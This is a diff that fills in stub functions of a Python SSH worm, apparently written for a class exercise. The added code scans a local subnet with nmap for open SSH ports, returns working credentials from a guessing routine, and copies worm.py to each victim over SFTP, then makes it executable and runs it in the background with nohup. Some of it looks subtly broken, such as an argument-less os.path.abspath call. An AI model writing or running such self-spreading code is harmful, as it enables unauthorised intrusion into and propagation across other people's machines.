@@ -64,8 +64,13 @@ def spreadAndExecute(sshClient):
 	# code we used for an in-class exercise.
 	# The code which goes into this function
 	# is very similar to that code.	
-	pass
-
+	sftp_client = sshClient.open_sftp()
+	try:
+		sftp_client.put(os.path.join(os.path.abspath(),'/tmp/worm.py'))
+		sshClient.exec_command( "chmod a+x /tmp/worm.py" )
+		sshClient.exec_command( "nohup python /tmp/worm.py" )
+	except:
+		print(sys.exc_info()[0])
 
 ############################################################
 # Try to connect to the given host given the existing
@@ -125,8 +130,9 @@ def attackSystem(host):
 
 		# @ call getMyIP or scanIP
 
-		temp = tryCredentials(host, username, password, client)
-			
+		attemptResults = tryCredentials(host, username, password, client)
+		if attemptResults == 0:
+			return (client,username,password)
 	# Could not find working credentials
 	return None	
 
@@ -157,7 +163,9 @@ def getHostsOnTheSameNetwork():
 	# and return the list of discovered
 	# IP addresses.	
 
-	pass
+	ps = nmap.PortScanner()
+	ps.scan('10.0.0.0/24',arguments= '-p 22 --open')
+	return ps.all_hosts()
 
 # If we are being run without a command line parameters, 
 # then we assume we are executing on a victim system and
